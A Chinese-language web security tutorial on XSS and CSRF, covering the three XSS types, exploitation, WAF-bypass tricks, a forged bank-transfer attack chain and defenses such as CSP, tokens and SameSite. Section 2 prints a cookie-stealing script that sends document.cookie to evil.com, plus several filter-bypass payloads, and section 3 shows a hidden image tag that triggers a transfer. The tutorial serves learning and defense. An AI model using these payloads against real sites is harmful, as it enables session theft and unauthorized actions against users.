---
title: "XSS漏洞深度利用与CSRF攻击链构造"
weight: 10
---

# XSS漏洞深度利用与CSRF攻击链构造

在 Web 安全的早期，XSS（跨站脚本攻击）与 CSRF（跨站请求伪造）是客户端安全领域的两大核心漏洞，在红队评估中常用于获取敏感凭证或执行越权操作。

今天，我们将深入 Web 前端攻防的深水区。探讨 **XSS（跨站脚本攻击）** 如何从一个简单的 `alert(1)` 演变为窃取敏感凭证、劫持用户操作的高级利用手法，以及它那伴生漏洞——**CSRF（跨站请求伪造）** 的底层攻击链。

---

## 1. XSS 漏洞的本质与三大流派

XSS 的本质与 SQL 注入如出一辙：**越界**。
当后端或前端 JavaScript 未经严格过滤，将用户输入的数据当做 HTML 代码直接渲染在页面上时，浏览器引擎就会“误认”这段数据为可执行的 JS 脚本。

### 1.1 三大流派对比

| 类型 | 存储位置 | 触发方式 | 危害与实战场景 |
| :--- | :--- | :--- | :--- |
| **反射型 (Reflected)** | URL 参数中 | 受害者点击黑客构造的恶意链接。 | 常用于针对特定目标的钓鱼攻击。黑客将 Payload 写在 `?search=<script>...` 中，诱导用户点击。 |
| **存储型 (Stored)** | 数据库中 | 用户正常访问受感染的页面。 | **危害极大**。常见于评论区、个人资料页。Payload 被存入数据库，任何访问该页面的用户都会中招（危害极高）。 |
| **DOM 型 (DOM-based)** | 前端 DOM 树中 | 纯前端 JS 处理 URL 的 hash (`#`) 或参数时出错。 | **最隐蔽**。恶意代码根本不经过后端服务器，直接在浏览器端被执行，传统 WAF 极难拦截。 |

---

## 2. 远不止 alert(1)：XSS 的深度利用与 WAF 绕过

在实战渗透中，弹窗只是为了证明漏洞存在（PoC）。黑客真正的目标是**数据窃取与会话劫持**。

### 2.1 窃取 Cookie 与突破 HttpOnly
最经典的 XSS 利用是窃取用户的登录凭证（Cookie）。
黑客注入的 Payload：
```html
<script>
  // 将受害者的 cookie 拼接到黑客服务器的图片请求中，悄无声息地发送出去
  new Image().src = "http://evil.com/steal?cookie=" + document.cookie;
</script>
```

**防御者的反击**：为了防止这种攻击，现代应用会给存储 Session ID 的 Cookie 加上 `HttpOnly` 标志。这会让 `document.cookie` 无法读取该 Cookie。
**黑客的再反击 (XSS 代理 / 键盘记录)**：
拿不到 Cookie 没关系，只要 XSS 脚本在运行，黑客就可以：
1. **注入键盘记录器**：监听 `onkeyup` 事件，记录用户在页面上输入的明文密码。
2. **利用 XSS 代理 (如 BeEF 框架)**：将被控浏览器变成黑客的“肉鸡”。黑客在控制台点一个按钮，受害者的浏览器就会自动向网银发起转账的 AJAX 请求。由于请求是浏览器自己发出的，它会**自动带上那个 HttpOnly 的 Cookie**，完美绕过防御！

### 2.2 WAF Bypass：各种奇技淫巧的 Payload
现代 WAF 肯定会拦截 `<script>` 标签。黑客必须利用 HTML 和浏览器的容错机制进行绕过。

1. **利用事件句柄 (Event Handlers)**：不使用 `<script>`，改用标签属性。
   ```html
   <img src="x" onerror="alert('XSS')">
   <body onload="alert('XSS')">
   ```
2. **伪协议绕过**：在 `<a>` 或 `<iframe>` 中使用 `javascript:` 伪协议。
   ```html
   <a href="javascript:alert(1)">Click me</a>
   ```
3. **大小写与闭合绕过**：如果后端只是简单替换了 `<script>`，可以尝试 `<ScRiPt>` 或双写 `<scr<script>ipt>`。
4. **编码混淆**：利用浏览器解析 HTML 实体编码、URL 编码的特性。
   ```html
   <!-- 将 alert 编码为 HTML 实体 -->
   <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
   ```

---

## 3. 借刀杀人：CSRF (跨站请求伪造) 攻击链

如果你登录了银行账户，却没有被 XSS 窃取 Cookie，你安全了吗？
不一定。如果银行的转账接口存在 **CSRF（Cross-Site Request Forgery）** 漏洞，黑客可以“借”你的手把钱转走。

### 3.1 CSRF 底层攻击链推演
CSRF 攻击依赖于浏览器的一个核心机制：**当你向某个域名发起请求时，浏览器会自动带上该域名下的所有 Cookie。**

**攻击场景推演**：
1. 受害者 Alice 登录了银行网站 `bank.com`，浏览器保留了有效的登录 Cookie。
2. 黑客诱导 Alice 在**同一个浏览器**的新标签页中打开了恶意网站 `evil.com`。
3. `evil.com` 网页中隐藏了一段代码，比如一个不可见的图片标签：
   ```html
   <img src="http://bank.com/transfer?to_account=hacker&amount=10000" style="display:none;">
   ```
4. **灾难发生**：Alice 的浏览器在解析到这个 `<img>` 标签时，会自动向 `bank.com` 发起 GET 请求去“加载图片”。
   关键在于，因为请求是发给 `bank.com` 的，**浏览器会自动把 Alice 的银行 Cookie 贴在这个请求头上！**
5. 银行服务器收到请求，验证 Cookie 发现是 Alice 本人，于是执行了转账操作。

*（如果是 POST 请求，黑客可以在 `evil.com` 中隐藏一个 `<form>` 表单，并用 JS 自动执行 `form.submit()`）。*

### 3.2 为什么前文说 SOP (同源策略) 挡不住 CSRF？
在《Web前端终极防线：SOP与CORS》一文中我们强调过：SOP 只拦截“跨域响应的读取”，**不拦截跨域请求的发送**。
在 CSRF 攻击中，黑客根本不关心转账接口返回了什么，他只需要请求**带着 Cookie 成功发到了银行服务器并被执行**就够了。因此，SOP 对传统的 CSRF 毫无办法。

---

## 4. 终极防御：如何同时防住 XSS 与 CSRF？

XSS 和 CSRF 是一对相辅相成的Payload。只要存在一个 XSS，所有的 CSRF 防御机制都会形同虚设（因为 XSS 脚本可以读取页面上的任何动态 Token）。

### 4.1 防御 XSS：CSP 与上下文转义
1. **HTML 转义 (Escaping)**：在将用户数据渲染到页面前，必须对特殊字符（如 `<` 变 `&lt;`，`>` 变 `&gt;`）进行实体转义。
2. **CSP (内容安全策略, Content Security Policy)**：这是终极杀招。在 HTTP 响应头中加入 `Content-Security-Policy: default-src 'self'`。这会强制浏览器**拒绝执行任何内联脚本（Inline Script，如 `<script>alert(1)</script>` 或 `onerror=`）**，并且只允许加载同源的 JS 文件，直接从根本上废掉 XSS。

### 4.2 防御 CSRF：Token 与 SameSite
1. **Anti-CSRF Token**：在用户的 Session 中生成一个随机的 Token，并在每次请求的参数或 Header 中带上。因为黑客在 `evil.com` 无法读取 `bank.com` 的页面源码（受 SOP 保护），他无法伪造这个随机 Token，请求就会被后端拒绝。
2. **Cookie 的 SameSite 属性**：这是现代浏览器的标配防御。
   在设置 Cookie 时加上 `SameSite=Lax` 或 `Strict`：
   `Set-Cookie: session_id=xyz; SameSite=Lax; Secure; HttpOnly`
   这样一来，如果请求是从 `evil.com` 发往 `bank.com` 的（跨站请求），**浏览器将拒绝在这个请求中带上 Cookie**，从物理上掐断了 CSRF 的攻击链。

